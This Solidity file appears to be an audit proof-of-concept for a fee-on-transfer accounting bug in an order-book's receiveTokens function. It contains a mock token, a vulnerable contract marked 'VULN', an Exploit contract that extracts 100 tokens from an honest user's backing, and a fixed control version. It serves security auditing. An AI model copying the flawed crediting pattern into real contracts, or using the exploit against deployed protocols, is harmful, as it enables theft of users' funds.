// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* Hanji LOB.receiveTokens (AuditVault 55171). safeTransferFrom of a
   fee-on-transfer token delivers 900 of a 1000 pull, but the credit
   increases by 1000. The attacker withdraws 1000. 100 of that is the
   honest trader's balance. The fixed path credits the balance delta. */

contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public feeTo;

    constructor(address feeTo_) {
        feeTo = feeTo_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        uint256 fee = amount / 10;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        balanceOf[feeTo] += fee;
        return true;
    }
}

contract LOB {
    FeeToken public token;
    bool public measureDelta;
    mapping(address => uint256) public credit;
    address public constant HONEST = address(0xA11CE);

    constructor(FeeToken token_, bool measureDelta_) {
        token = token_;
        measureDelta = measureDelta_;
    }

    function seed(address user, uint256 amount) external {
        credit[user] = amount;
    }

    function receiveTokens(address from, uint256 amount) external {
        uint256 beforeBal = token.balanceOf(address(this));
        require(token.transferFrom(from, address(this), amount), "pull");
        uint256 received = token.balanceOf(address(this)) - beforeBal;
        if (measureDelta) {
            credit[from] += received;
        } else {
            // @> VULN: credit increases by `amount`, not by the tokens that arrived
            credit[from] += amount;
        }
    }

    function withdraw(address to, uint256 amount) external {
        require(credit[msg.sender] >= amount, "credit");
        credit[msg.sender] -= amount;
        require(token.transfer(to, amount), "pay");
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;

    FeeToken public token;
    LOB public lob;
    LOB public fixedLob;
    uint256 public profit;
    uint256 public honestShort;
    uint256 public controlProfit;

    constructor() {
        token = new FeeToken(address(this));
        lob = new LOB(token, false);
        fixedLob = new LOB(token, true);
        token.mint(address(this), N);
        token.mint(address(lob), N);
        token.mint(address(fixedLob), N);
        lob.seed(address(0xA11CE), N);
        fixedLob.seed(address(0xA11CE), N);
    }

    function run() external {
        uint256 start = token.balanceOf(address(this));
        token.approve(address(lob), N);
        lob.receiveTokens(address(this), N);
        require(lob.credit(address(this)) == N, "credit");
        require(token.balanceOf(address(lob)) == N + 900 ether, "received");
        lob.withdraw(address(this), N);
        profit = token.balanceOf(address(this)) - start;
        honestShort = lob.credit(address(0xA11CE)) - token.balanceOf(address(lob));
        require(profit == 100 ether, "profit");
        require(honestShort == 100 ether, "short");
        require(token.balanceOf(address(lob)) == 900 ether, "left");
    }

    function runControl() external {
        uint256 start = token.balanceOf(address(this));
        token.approve(address(fixedLob), N);
        fixedLob.receiveTokens(address(this), N);
        require(fixedLob.credit(address(this)) == 900 ether, "credit");
        fixedLob.withdraw(address(this), 900 ether);
        controlProfit = token.balanceOf(address(this)) - start;
        require(controlProfit == 0, "flat");
        require(token.balanceOf(address(fixedLob)) == N, "honest backed");
    }
}
